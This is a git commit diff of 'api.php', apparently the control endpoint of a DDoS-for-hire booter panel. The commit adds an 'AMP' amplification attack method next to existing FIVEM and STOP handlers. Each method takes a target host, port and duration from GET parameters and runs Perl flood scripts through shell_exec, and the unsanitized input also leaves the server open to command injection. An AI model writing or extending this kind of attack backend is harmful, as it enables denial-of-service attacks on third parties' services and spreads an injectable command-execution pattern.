c71fc76c6c4d2740a027b1c79f4bd07d3b985b89
NCDev <55439243+xenfovn@users.noreply.github.com>
2022-09-12 09:18:06 +0700

    Update api.php

--- api.php
+++ api.php
@@ -5,7 +5,8 @@ $port = $_GET['port'];
 $time = $_GET['time'];
 $method = $_GET['method'];
 switch($method) {
-    case 'FIVEM': $output = shell_exec("screen -dmS $host perl code/FIVEM.pl $host $time"); die("attack sent to $host per $time seconds."); break; 
+    case 'FIVEM': $output = shell_exec("screen -dmS $host perl code/FIVEM.pl $host $time"); die("attack sent to $host per $time seconds."); break;
+    case 'AMP': $output = shell_exec("screen -dmS $host perl code/AMP.pl $host $port 10000 $time "); die("attack sent to $host per $time seconds."); break; 
     case 'STOP': $output = shell_exec("screen -X -s $host quit"); die("The attacks that were running on the host $host were finalized!"); break;
     default: die('Wrong method !'); 
 }
